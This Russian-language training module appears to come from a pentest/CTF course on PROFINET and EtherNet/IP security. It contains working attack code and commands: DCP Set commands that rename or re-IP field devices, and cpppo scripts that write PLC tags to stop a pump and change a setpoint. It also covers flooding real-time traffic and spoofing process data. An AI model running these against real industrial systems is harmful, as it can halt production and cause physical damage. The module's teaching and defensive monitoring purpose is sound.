---
id: hardware-profinet-enip
title: "Profinet и EtherNet/IP"
category: hardware
parent: hardware-mod-ics-protocols
difficulty: hard
order: 2
tags: [profinet, ethernetip, cip, ics]
prerequisites: [hardware-dnp3, hardware-ics]
useful_for:
  - "Пентест промышленных Ethernet-сетей"
  - "Аудит дискретного производства"
  - "CTF Hardware/ICS"
estimated_minutes: 70
summary: "Промышленный Ethernet: PROFINET (DCP, RT/IRT, GSDML) и EtherNet/IP (CIP, explicit/implicit messaging, список тегов). Обнаружение, чтение и запись через явные сообщения, риски и защита."
---

Если Modbus и DNP3 — это «серийные» протоколы, то **PROFINET** и **EtherNet/IP** — это промышленный Ethernet. Они работают поверх обычного TCP/IP и L2-кадров, но с жёсткими требованиями к детерминизму: привод должен получать данные каждые несколько миллисекунд. Это накладывает отпечаток и на архитектуру, и на безопасность. Здесь нет универсальной аутентификации: устройство в сети по умолчанию доверяет тому, кто говорит на правильном протоколе.

## PROFINET: общая картина

**PROFINET** — стандарт Siemens/PI (PROFIBUS & PROFINET International). Три роли:

- **IO-Controller** — «мозг» (ПЛК), управляет устройствами.
- **IO-Device** — полевое устройство (модуль ввода-вывода, привод, датчик).
- **IO-Supervisor** — инженерная станция для диагностики/настройки.

Ключевые механизмы:

- **DCP** (Discovery and Configuration Protocol) — обнаружение и назначение имени/IP по L2 (EtherType 0x8892).
- **RT** (Real-Time) — циклический обмен реального времени, класс 1.
- **IRT** (Isochronous Real-Time) — для motion-задач, синхронный.
- **NRT/acyclic** — обычный TCP/UDP для параметризации (записи параметров, диагностика).
- **GSDML** — XML-описание устройства (какие модули и параметры есть).

Имя устройства (`имя.profinet`) — критично: IO-Controller привязывается к IO-Device **по имени**, не по MAC. Кто переименует устройство, тот перенаправит контроллер на другой физический модуль.

## EtherNet/IP: CIP внутри

**EtherNet/IP** — реализация **CIP** (Common Industrial Protocol) поверх Ethernet. Разработан Rockwell Automation (Allen-Bradley), сейчас — ODVA. Роли:

- **Scanner** (аналог IO-Controller) — опрашивает устройства.
- **Adapter** (аналог IO-Device) — отвечает.

CIP определяет объекты: **Identity (0x01)**, **Message Router (0x02)**, **Assembly (0x04)**, **Connection Manager (0x06)**, **TCP/IP Interface (0xF5)**, **Ethernet Link (0xF6)**. Два вида обмена:

- **Implicit (Class 1)** — циклический через UDP/2222, по предварительно установленному соединению.
- **Explicit** — запрос-ответ через TCP/44818; используется для настройки и чтения тегов.

Именно **explicit messaging** и есть главный инструмент пентестера: через CIP можно читать и писать теги ПЛК.

## Порты и EtherType

| Протокол | Транспорт | Порт/тип |
|----------|-----------|----------|
| PROFINET DCP | L2 | EtherType 0x8892 |
| PROFINET RT | L2 | EtherType 0x8892 |
| PROFINET RPC | UDP/TCP | 34964 / 34963 |
| EtherNet/IP explicit | TCP | 44818 |
| EtherNet/IP implicit | UDP | 2222 |
| ENIP-Discovery (ListIdentity) | UDP | 44818 |

## Обнаружение устройств

### PROFINET DCP

```bash
# Установить инструменты
sudo apt install -y python3-scapy wireshark
# Отправляем DCP Identify All (broadcast L2)
python3 - <<'PY'
from scapy.all import *
from scapy.contrib.pnio import *
pkt = Ether(dst="01:0e:cf:00:00:00")/PNIO()
sendp(pkt, iface="eth0", loop=1, inter=1)
PY
```

Пример вывода Wireshark:

```text
PROFINET DCP
  Service ID: Identify (0x05)
  Service Type: Response Success (0x01)
  Xid: 0x00000001
  Station Name: plc-line1
  IP: 10.0.0.20
  Subnetmask: 255.255.255.0
  Device Vendor: Siemens
  Device Type: ET200SP
```

Инструмент **`pnio_dcp`** (из пакета `profinet-tools`) делает это удобнее:

```bash
python3 pnio_dcp.py -i eth0 -l          # список устройств
python3 pnio_dcp.py -i eth0 -n plc-line1 --set-ip 10.0.0.99
```

Последняя команда переименовывает/переназначает IP устройства — атака целостности (устройство пропадёт из-под контроля).

### EtherNet/IP ListIdentity

```bash
# Пакет ListIdentity по UDP/44818
python3 - <<'PY'
from scapy.all import *
from scapy.contrib.enip import *
pkt = Ether()/IP(dst="10.0.0.255")/UDP(sport=44818, dport=44818)/ENIP()/ENIPListIdentity()
sendp(pkt, iface="eth0")
PY
```

Ответ содержит **Identity Object**:

```text
EtherNet/IP ListIdentity Reply
  Vendor ID: 1 (Rockwell Automation/Allen-Bradley)
  Device Type: 14 (Programmable Logic Controller)
  Product Code: 176
  Revision: 3.3
  Status: 0x0030
  Serial: 0x1a2b3c4d
  Product Name: CompactLogix 5380
  State: RUN
  IP: 10.0.0.30
```

`Product Name` и `State` сразу говорят, что это и работает ли контроллер. `State: RUN` — программа исполняется.

## Чтение и запись тегов (EtherNet/IP)

Через explicit messaging читают/пишут **теги** (symbolic names) или **Assembly** объекты. Инструменты:

| Инструмент | Язык | Назначение |
|-----------|------|-----------|
| `cpppo` | Python | полный ENIP/CIP-стек |
| `pycomm3` | Python | работа с Logix-тегами |
| `enip-python` | Python | низкоуровневый ENIP |
| `RSEmulate`/`RSLinx` | Windows | легитимные инструменты |
| `plcscan` | Python | обнаружение ПЛК |

### Пример: чтение тега через cpppo

```bash
pip install cpppo
python3 - <<'PY'
from cpppo.server.enip.get_attribute import proxy_simple as proxy
p = proxy(['10.0.0.30'])
for tag in ['Program:MainProgram.TankLevel', 'Program:MainProgram.PumpRun']:
    v, = p.read([tag])
    print(tag, '=', v)
PY
```

Пример вывода:

```text
Program:MainProgram.TankLevel = 78.4
Program:MainProgram.PumpRun = True
```

### Пример: запись тега

```python
from cpppo.server.enip.get_attribute import proxy_simple as proxy
p = proxy(['10.0.0.30'])
p.write([('Program:MainProgram.PumpRun', False)])
print("PumpRun set to False")
```

Это останавливает насос — реальное физическое действие. Только в лаборатории или по разрешению.

## PROFINET: запись параметров

Acyclic (NRT) сервисы PROFINET позволяют читать/писать параметры модулей через RPC. Инструмент **`pnio`** / **`profinet-py`**:

```bash
pip install profinet-py
python3 - <<'PY'
from profinet import ProfinetDevice
d = ProfinetDevice("eth0", "plc-line1")
d.connect()
print(d.read_parameters())          # список параметров модуля
d.write_parameter("CycleTime", 16)  # записать параметр (мс)
PY
```

Запись неверного параметра может нарушить цикл обмена и остановить линию.

## Уязвимости и векторы атак

- **Отсутствие аутентификации**: DCP/ENIP не проверяют, кто шлёт команды.
- **Переименование устройств (DCP Set)**: подмена имени → контроллер работает с чужим модулем.
- **Спуфинг IO-Device**: атакующий подменяет полевое устройство и подаёт ложные данные.
- **Запись тегов**: изменение уставок/команд через CIP explicit.
- **DoS на RT-трафик**: flood нарушает детерминизм, контроллер уходит в ошибку.
- **Открытые инженерные порты** в IT-сети.
- **GSDML/EDS с секретами**: файлы описания содержат параметры и иногда учётки.

## Разобранный пример: смена IP IO-Device через DCP

```text
1. Обнаружили устройство: Station Name = valve-7, IP = 10.0.0.41
2. Сбрасываем/меняем имя или IP через DCP Set
3. IO-Controller теряет связь с valve-7
4. Контроллер уходит в STOP, линия встаёт
```

Команда:

```bash
python3 pnio_dcp.py -i eth0 -n valve-7 --set-ip 10.0.0.241
```

Это демонстрация целостности, не требующая пароля. Защита — только сегментация и физический контроль, потому что DCP by design без аутентификации.

## Edge cases и подводные камни

- **Multicast vs broadcast**: DCP Identify идёт на multicast-MAC `01:0e:cf:00:00:00`; неверный dst = устройства не ответят.
- **VLAN-теги**: промышленные сети часто в VLAN; ставьте свой интерфейс в нужный VLAN.
- **Implicit-соединения** не читаются «на лету» — их надо установить; для анализа удобнее explicit.
- **Assembly vs symbolic tags**: не все ПЛК поддерживают символические имена; для некоторых нужен EDS и Assembly.
- **EDS-файлы**: без них часть инструментов не знает структуру данных.
- **State: RUN/PROGRAM**: в PROGRAM контроллер логику не исполняет — запись тега может не дать эффекта.
- **Класс 1 соединение занято** одним scanner'ом; второй scanner не всегда сможет подключиться.

## Ссылочные таблицы

| PROFINET | Значение |
|----------|----------|
| DCP | Discovery and Configuration Protocol |
| RT / IRT | Real-Time / Isochronous RT |
| GSDML | XML-описание устройства |
| IO-Controller | управляющий ПЛК |
| IO-Device | полевое устройство |

| EtherNet/IP | Значение |
|-------------|----------|
| CIP | Common Industrial Protocol |
| Scanner / Adapter | ведущий / ведомый |
| Explicit | TCP/44818, запрос-ответ |
| Implicit | UDP/2222, циклический |
| Assembly Object | 0x04 |
| Identity Object | 0x01 |

## Что дальше / решение

- Нужна эксплуатация ПЛК → `hardware-plc-deep`.
- Нужен DNP3 → `hardware-dnp3`.
- Нужен Modbus → `hardware-modbus-deep`.
- Общий контекст OT → `hardware-ics`, `hardware-scada`.
- Лаборатория → `Conpot`, `cpppo`, `GRFICS`.

## Профили и опрос Modbus в промышленном Ethernet

Хотя PROFINET и EtherNet/IP — самостоятельные протоколы, на объектах часто рядом живёт Modbus TCP (порт 502) для шлюзов и «прослоек». Полезно уметь быстро проверить весь промышленный Ethernet-сегмент:

```bash
# Один проход по типовым OT-портам
nmap -p 102,502,44818,20000,4840,34964 -sV --open 10.0.0.0/24
```

Пример результата:

```text
Nmap scan report for 10.0.0.20
PORT      STATE SERVICE
102/tcp   open  iso-tsap
502/tcp   open  mbap
44818/tcp open  EtherNet-IP-2
```

Наличие 102 рядом с 44818 означает смешанную сеть Siemens + Rockwell — частый признак плохо сегментированного объекта.

## Разбор трафика PROFINET RT

RT-трафик идёт по L2, поэтому Wireshark должен видеть кадры напрямую. Полезные фильтры:

```text
pn_rt          # PROFINET Real-Time
pn_dcp         # Discovery and Configuration
enip           # EtherNet/IP
cip            # CIP поверх ENIP
```

Пример разбора циклического обмена:

```text
PROFINET RT
  FrameID: 0x8000 (RT Class 1)
  CycleCounter: 123456
  IOData: 8 bytes
    Module 1: 0x0A 0x00 (input)
    Module 2: 0x01 (output)
```

Изменение байтов `IOData` «на лету» (через прокси-устройство) — это спуфинг данных процесса: контроллер увидит ложные показания датчиков.

## Оценка детерминизма и DoS

RT/IRT требуют предсказуемого времени. Инструменты стресс-теста (только в лаборатории):

```bash
# Генерация фонового трафика для проверки устойчивости
iperf3 -c 10.0.0.20 -t 60 -P 8
# Наблюдение за счётчиками ошибок на коммутаторе (SNMP)
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.2.2.1.14
```

Рост `ifInErrors`/`ifOutDiscards` на промышленном коммутаторе указывает на перегрузку, при которой контроллер может уйти в ошибку цикла.

## Разобранный пример: изменение уставки через EtherNet/IP

```text
1. Обнаружили CompactLogix (10.0.0.30, Product Name: CompactLogix 5380).
2. Прочитали тег Program:MainProgram.Setpoint = 50.0
3. Записали новое значение через cpppo.
4. Проверили чтением — значение изменилось.
```

```bash
python3 - <<'PY'
from cpppo.server.enip.get_attribute import proxy_simple as proxy
p = proxy(['10.0.0.30'])
print("before:", p.read([('Program:MainProgram.Setpoint',)])[0])
p.write([('Program:MainProgram.Setpoint', 75.0)])
print("after: ", p.read([('Program:MainProgram.Setpoint',)])[0])
PY
```

Пример вывода:

```text
before: 50.0
after:  75.0
```

Это меняет технологический параметр. Только в лаборатории или по письменному разрешению.

## Мониторинг и базлайн

В OT-сети активное сканирование рискованно, поэтому основа — **пассивный мониторинг** и **базлайн**:

- Захват зеркального порта: `tcpdump -i eth0 -n 'ether proto 0x8892 or tcp port 44818' -w ot.pcap`.
- Нормальный профиль: кто с кем говорит, какие теги пишутся, когда.
- Аномалии: новые DCP Set, необычные CIP-запросы записи, всплески Hard Reset.
- Средства: Zeek с OT-скриптами, Nozomi, Claroty, Dragos.

Построив базлайн, вы замечаете попытки переименования устройств и записи тегов, которые в норме не происходят.

## Квиз

```quiz
- question: "На каком EtherType работает PROFINET DCP?"
  options:
    - "0x0800"
    - "0x8892"
    - "0x8100"
    - "0x86DD"
  answer: 1
  explanation: "PROFINET использует EtherType 0x8892."
- question: "Какой порт у EtherNet/IP explicit messaging?"
  options:
    - "502"
    - "20000"
    - "44818"
    - "34964"
  answer: 2
  explanation: "Explicit CIP — TCP/44818."
- question: "Почему переименование IO-Device через DCP опасно?"
  options:
    - "Устройство перегреется"
    - "IO-Controller привязан к устройству по имени и потеряет связь"
    - "Порт закроется"
    - "Изменится MAC"
  answer: 1
  explanation: "Привязка по Station Name делает переименование атакой целостности."
- question: "Что такое CIP?"
  options:
    - "Тип кабеля"
    - "Common Industrial Protocol — прикладной уровень EtherNet/IP"
    - "Протокол шифрования"
    - "Формат файла"
  answer: 1
  explanation: "CIP — прикладной протокол, на котором стоит EtherNet/IP."
- question: "Каким инструментом читают/пишут теги Allen-Bradley?"
  options:
    - "nmap"
    - "cpppo / pycomm3"
    - "tcpdump"
    - "binwalk"
  answer: 1
  explanation: "cpppo и pycomm3 работают с ENIP/CIP и тегами Logix."
```

## Где пригодится

- **Пентест:** аудит дискретного производства (Siemens/Rockwell).
- **CTF:** задачи Hardware/ICS по промышленному Ethernet.
- **Аудит:** проверка сегментации и доступа к 44818/RT.
- **Работа:** проектирование защищённых OT-сетей.
- **Дальше по дереву:** `hardware-plc-deep`, `hardware-ics`.
